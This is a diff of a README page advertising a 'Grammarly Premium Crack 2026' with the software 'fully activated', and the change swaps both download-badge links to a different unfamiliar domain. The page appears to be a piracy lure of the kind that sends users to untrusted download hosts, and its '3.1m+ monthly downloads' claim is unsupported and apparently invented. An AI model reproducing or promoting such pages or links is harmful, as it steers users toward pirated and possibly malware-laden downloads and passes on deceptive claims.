@@ -1,6 +1,6 @@
 # Grammarly Premium Crack 2026 — AI Writing
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/gramm)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://p-csx-5.com/gramm)
 
 > **Grammarly Premium fully activated — advanced writing suggestions, tone detection, plagiarism checker.**
 
@@ -48,7 +48,7 @@ A: Yes — works in Gmail, Docs, Word, Outlook, and 500+ more.
 
 **Monthly downloads:** 3.1m+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/gramm)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://p-csx-5.com/gramm)
 
 ---
 
